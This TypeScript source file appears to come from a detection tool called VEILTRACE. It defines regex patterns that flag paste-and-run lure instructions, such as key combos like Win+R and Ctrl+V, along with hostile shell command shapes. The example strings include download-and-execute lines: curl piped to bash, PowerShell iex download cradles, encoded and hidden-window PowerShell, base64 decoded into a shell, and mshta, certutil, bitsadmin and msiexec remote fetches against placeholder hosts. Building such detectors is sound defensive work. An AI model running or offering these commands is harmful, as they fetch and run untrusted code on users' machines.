// Language-neutral entries: key combinations and shell command shapes.
// Command patterns describe *shapes* (download-and-execute, encoded payloads, LOLBin remote fetch),
// not specific campaigns. Written for VEILTRACE; not derived from third-party rule sets.
import type { LexiconEntry } from '../types.js';
import { B, CMD, CTRL, E, SEP, WIN, entry } from './patterns.js';

export const NEUTRAL: LexiconEntry[] = [
  // A.OPEN_RUN
  entry('any.open.combo_win_r', 'A.OPEN_RUN', 'any', 'strong', `${B}${WIN}${SEP}r${E}`,
    ['Win+R', 'Windows + R', '⊞ + R', 'tombol Windows dan R', 'Windows Key + R']),
  entry('any.open.combo_win_x', 'A.OPEN_RUN', 'any', 'strong', `${B}${WIN}${SEP}x${E}`,
    ['Win + X', 'Windows+X']),
  entry('any.open.combo_spotlight', 'A.OPEN_RUN', 'any', 'strong', `${B}${CMD}${SEP}(?:space|spasi)${E}`,
    ['Cmd + Space', '⌘ + Space', 'Command+Spasi']),
  entry('any.open.start_run', 'A.OPEN_RUN', 'any', 'strong', `${B}start\\s*(?:>|→|»)\\s*run${E}`,
    ['Start > Run']),

  // A.PASTE
  entry('any.paste.combo_ctrl_v', 'A.PASTE', 'any', 'strong', `${B}${CTRL}${SEP}v${E}`,
    ['Ctrl+V', 'CTRL + V', 'Control V']),
  entry('any.paste.combo_cmd_v', 'A.PASTE', 'any', 'strong', `${B}${CMD}${SEP}v${E}`,
    ['⌘+V', 'Cmd + V']),
  entry('any.paste.combo_shift_insert', 'A.PASTE', 'any', 'strong', `${B}shift${SEP}(?:insert|ins)${E}`,
    ['Shift + Insert']),

  // A.EXECUTE
  entry('any.exec.combo_ctrl_shift_enter', 'A.EXECUTE', 'any', 'strong', `${B}${CTRL}${SEP}shift${SEP}enter${E}`,
    ['Ctrl + Shift + Enter']),

  // A.COMMAND, strong: execution / download-and-execute / encoded payload shapes
  entry('any.cmd.ps_encoded', 'A.COMMAND', 'any', 'strong',
    `${B}(?:powershell|pwsh)(?:\\.exe)?${E}.{0,80}?\\s-(?:e|ec|enc|encodedcommand)\\s+[a-z0-9+/=]{16,}`,
    ['powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi']),
  entry('any.cmd.ps_hidden_window', 'A.COMMAND', 'any', 'strong',
    `${B}(?:powershell|pwsh)(?:\\.exe)?${E}.{0,40}?\\s-(?:w|win|window|windowstyle)\\s+(?:h|hidden|1)${E}`,
    ['powershell -w hidden -c calc', 'PowerShell.exe -WindowStyle Hidden']),
  entry('any.cmd.ps_iex_download', 'A.COMMAND', 'any', 'strong',
    `${B}(?:iex|invoke-expression)\\s*\\(?\\s*\\(?\\s*(?:new-object\\s+(?:system\\.)?net\\.webclient|iwr|irm|invoke-webrequest|invoke-restmethod)${E}`,
    ["iex (New-Object Net.WebClient).DownloadString('http://example.invalid/a')", 'IEX(irm example.invalid)']),
  entry('any.cmd.pipe_to_iex', 'A.COMMAND', 'any', 'strong',
    `${B}(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget)\\s[^|]{1,200}\\|\\s*(?:iex|invoke-expression)${E}`,
    ['irm https://example.invalid/x | iex']),
  entry('any.cmd.mshta_remote', 'A.COMMAND', 'any', 'strong',
    `${B}mshta(?:\\.exe)?\\s+["']?(?:https?:|\\\\\\\\|vbscript:|javascript:)`,
    ['mshta https://example.invalid/a.hta', 'mshta.exe "http://192.0.2.1/x"']),
  entry('any.cmd.lolbin_download', 'A.COMMAND', 'any', 'strong',
    `${B}(?:certutil(?:\\.exe)?\\s.{0,40}?-urlcache|bitsadmin(?:\\.exe)?\\s.{0,20}?/transfer|regsvr32(?:\\.exe)?\\s.{0,40}?/i:https?:|rundll32(?:\\.exe)?\\s.{0,20}?javascript:)`,
    ['certutil -urlcache -split -f http://example.invalid/a.exe', 'bitsadmin /transfer job http://example.invalid/a']),
  entry('any.cmd.curl_pipe_shell', 'A.COMMAND', 'any', 'strong',
    `${B}(?:curl|wget)\\s[^|]{1,200}\\|\\s*(?:sudo\\s+)?(?:ba|z|da)?sh${E}`,
    ['curl -fsSL https://example.invalid/i.sh | bash', 'wget -qO- http://example.invalid/x | sh']),
  entry('any.cmd.shell_substitution', 'A.COMMAND', 'any', 'strong',
    `${B}(?:ba|z)?sh\\s+-c\\s+["']?\\$\\(\\s*(?:curl|wget)${E}`,
    ['bash -c "$(curl -fsSL https://example.invalid/x)"']),
  entry('any.cmd.base64_to_shell', 'A.COMMAND', 'any', 'strong',
    `${B}(?:echo|printf)\\s+["']?[a-z0-9+/=]{16,}["']?\\s*\\|\\s*base64\\s+(?:-d|--decode)[^|]{0,10}\\|\\s*(?:ba|z)?sh${E}`,
    ["echo 'Y3VybCBleGFtcGxlLmludmFsaWQ=' | base64 -d | bash"]),
  entry('any.cmd.osascript', 'A.COMMAND', 'any', 'strong', `${B}osascript\\s+-e${E}`,
    ['osascript -e \'do shell script "x"\'']),
  entry('any.cmd.cmd_chain', 'A.COMMAND', 'any', 'strong',
    `${B}cmd(?:\\.exe)?\\s+/[ck]\\s.{0,60}?(?:start\\s+/min|powershell|mshta|curl|certutil|bitsadmin)${E}`,
    ['cmd /c start /min powershell -c x', 'cmd.exe /c curl http://example.invalid -o a.exe']),
  entry('any.cmd.msiexec_remote', 'A.COMMAND', 'any', 'strong',
    `${B}msiexec(?:\\.exe)?\\s.{0,20}?/(?:i|package)\\s+["']?https?:`,
    ['msiexec /q /i https://example.invalid/a.msi']),
  entry('any.cmd.conhost_headless', 'A.COMMAND', 'any', 'strong', `${B}conhost(?:\\.exe)?\\s+--headless${E}`,
    ['conhost.exe --headless powershell']),

  // A.COMMAND, weak: shell invocation without an execution/download shape (observation only)
  entry('any.cmd.ps_invocation', 'A.COMMAND', 'any', 'weak', `${B}(?:powershell|pwsh)(?:\\.exe)?\\s+-[a-z]+${E}`,
    ['powershell -NoProfile']),
  entry('any.cmd.fetch_url', 'A.COMMAND', 'any', 'weak', `${B}(?:curl|wget)\\s+(?:-[a-z]+\\s+)*https?:`,
    ['curl -O https://example.invalid/file.tar.gz']),
];
